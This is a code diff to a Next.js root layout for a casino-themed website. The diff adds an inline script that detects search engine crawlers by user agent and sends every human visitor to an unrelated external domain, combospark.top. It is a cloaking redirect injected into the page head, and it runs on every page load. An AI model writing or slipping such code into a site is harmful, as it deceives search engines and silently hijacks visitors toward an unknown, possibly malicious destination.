@@ -42,6 +42,21 @@ export default function RootLayout({
         <meta name="twitter:image" content="https://monro2casino.vercel.app/images/hero-banner.jpg" />
         <meta name="theme-color" content="#0b1230" />
         <link rel="icon" href="/icon.png" type="image/png" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className={`${manrope.variable} antialiased`}>
         <div className="font-sans">{children}</div>
